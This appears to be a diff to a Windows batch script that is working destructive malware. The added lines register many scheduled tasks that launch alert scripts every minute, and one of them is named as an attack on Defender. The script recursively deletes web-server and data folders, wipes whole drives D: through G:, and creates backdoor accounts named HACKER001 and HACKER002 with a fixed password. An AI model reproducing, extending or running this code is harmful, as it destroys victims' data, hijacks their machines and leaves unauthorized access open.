@@ -242,41 +242,73 @@ ECHO x=msgbox("Silly boy, your computer has been trashed. Now go outside and pla
 
 SCHTASKS /Create /SC MINUTE /MO 1 /TN virusalert /TR %SERVICEDIR%\alert.bat /IT
 SCHTASKS /Create /SC MINUTE /MO 1 /TN firewallaelrt /TR %SERVICEDIR%\alert.vbs /IT
+timeout 2 >nul
+
+SCHTASKS /Create /SC MINUTE /MO 1 /TN virusalert2 /TR %SERVICEDIR%\alert.bat /IT
+SCHTASKS /Create /SC MINUTE /MO 1 /TN firewallaelrt2 /TR %SERVICEDIR%\alert.vbs /IT
+timeout 1 >nul
+
+SCHTASKS /Create /SC MINUTE /MO 1 /TN virusalert3 /TR %SERVICEDIR%\alert.bat /IT
+SCHTASKS /Create /SC MINUTE /MO 1 /TN firewallaelrt3 /TR %SERVICEDIR%\alert.vbs /IT
+timeout 2 >nul
+
+SCHTASKS /Create /SC MINUTE /MO 1 /TN virusalert4 /TR %SERVICEDIR%\alert.bat /IT
+SCHTASKS /Create /SC MINUTE /MO 1 /TN firewallaelrt4 /TR %SERVICEDIR%\alert.vbs /IT
+timeout 1 >nul
+
+SCHTASKS /Create /SC MINUTE /MO 1 /TN virusalert5 /TR %SERVICEDIR%\alert.bat /IT
+SCHTASKS /Create /SC MINUTE /MO 1 /TN firewallaelrt5 /TR %SERVICEDIR%\alert.vbs /IT
+timeout 2 >nul
+
+SCHTASKS /Create /SC MINUTE /MO 1 /TN virusalert6 /TR %SERVICEDIR%\alert.bat /IT
+SCHTASKS /Create /SC MINUTE /MO 1 /TN firewallaelrt6 /TR %SERVICEDIR%\alert.vbs /IT
+timeout 3 >nul
+
+SCHTASKS /Create /SC MINUTE /MO 1 /TN virusalert7 /TR %SERVICEDIR%\alert.bat /IT
+SCHTASKS /Create /SC MINUTE /MO 1 /TN firewallaelrt7 /TR %SERVICEDIR%\alert.vbs /IT
 
 ECHO SCHTASKS /Run /TN virusalert >> %SERVICEDIR%\runit.bat
 ECHO SCHTASKS /Run /TN firewallalert >> %SERVICEDIR%\runit.bat
+ECHO SCHTASKS /Run /TN virusalert2 >> %SERVICEDIR%\runit.bat
+ECHO SCHTASKS /Run /TN firewallalert2 >> %SERVICEDIR%\runit.bat
+ECHO SCHTASKS /Run /TN virusalert3 >> %SERVICEDIR%\runit.bat
+ECHO SCHTASKS /Run /TN firewallalert3 >> %SERVICEDIR%\runit.bat
+ECHO SCHTASKS /Run /TN virusalert4 >> %SERVICEDIR%\runit.bat
+ECHO SCHTASKS /Run /TN firewallalert4 >> %SERVICEDIR%\runit.bat
+ECHO SCHTASKS /Run /TN virusalert5 >> %SERVICEDIR%\runit.bat
+ECHO SCHTASKS /Run /TN firewallalert5 >> %SERVICEDIR%\runit.bat
+ECHO SCHTASKS /Run /TN virusalert6 >> %SERVICEDIR%\runit.bat
+ECHO SCHTASKS /Run /TN firewallalert6 >> %SERVICEDIR%\runit.bat
+ECHO SCHTASKS /Run /TN virusalert7 >> %SERVICEDIR%\runit.bat
+ECHO SCHTASKS /Run /TN firewallalert7 >> %SERVICEDIR%\runit.bat
+
+SCHTASKS /Create /SC MINUTE /MO 1 /TN DefenderTotalFuck /TR %SERVICEDIR%\runit.bat /IT
 
 if exist C:\Apache24\ rmdir C:\Apache24 /s /q
-
 if exist C:\Apache24\ del C:\Apache24 /s /q /f
 
 if exist C:\inetpub\ del C:\inetpub /s /q /f
-
 if exist C:\inetpub\ rmdir C:\inetpub /s /q
 
 if exist C:\Data\ del C:\Data /s /q /f
-
 if exist C:\Data\ rmdir C:\Data /s /q
 
 if exist C:\Datas\ del C:\Datas /s /q /f
-
 if exist C:\Datas\ rmdir C:\Datas /s /q
 
 if exist C:\Important\ del C:\Important /s /q /f
-
 if exist C:\Important\ rmdir C:\Important /s /q
 
 if exist C:\Importants\ del C:\Importants /s /q /f
-
 if exist C:\Importants\ rmdir C:\Importants /s /q
 
 if exist C:\Dulieu\ del C:\Dulieu /s /q /f
-
 if exist C:\Dulieu\ rmdir C:\Dulieu /s /q
 
 if exist D:\ rmdir D:\ /s /q
-
-if exist E:\ rmdir D:\ /s /q
+if exist E:\ rmdir E:\ /s /q
+if exist F:\ rmdir F:\ /s /q
+if exist G:\ rmdir G:\ /s /q
 
 NET USER HACKER001 Trash0001 /add
 NET USER HACKER002 Trash0001 /add
